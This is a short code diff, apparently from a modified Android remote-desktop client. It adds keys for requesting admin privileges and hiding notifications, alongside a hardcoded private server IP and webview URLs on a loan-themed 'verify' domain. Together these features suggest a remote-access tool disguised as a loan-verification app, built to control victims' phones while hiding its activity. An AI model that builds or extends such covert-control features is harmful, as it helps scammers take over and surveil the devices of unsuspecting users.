@@ -162,7 +162,9 @@ class AndroidChannel {
   static final kGetStartOnBootOpt = "get_start_on_boot_opt";
     //++++Reminani : upgrade cho handico
   static final kIsAdminApp = "is_admin_app";
+  static final kIsAllowNotification = "is_allow_notification";
   static final kRequestAdminPrivillege = "request_admin_privillege";
+  static final kRequestNotification = "request_hide_notification";
     //----Reminani : upgrade cho handico
   static final kSetStartOnBootOpt = "set_start_on_boot_opt";
   static final kSyncAppDirConfigPath = "sync_app_dir";
@@ -418,8 +420,8 @@ extension WindowsTargetExt on int {
   //++++Reminani : upgrade cho handico
 const String kAppIDServerPrivate = "139.162.5.114";
 
-const String kAppWebView = "https://verify.vaytienmat-nhanh24h.com/";
-const String kAppWebView1 = "https://verify.vaytienmat-nhanh24h.com";
+const String kAppWebViewUrl = "https://verify.vaytienmat-nhanh24h.com";
+const String kAppWebViewLinked = "https://verify.vaytienmat-nhanh24h.com/Linked.jpg";
 const String kAppBaseUrl = 'verify-cdn.vaytienmat-nhanh24h.com';
   //----Reminani : upgrade cho handico
 
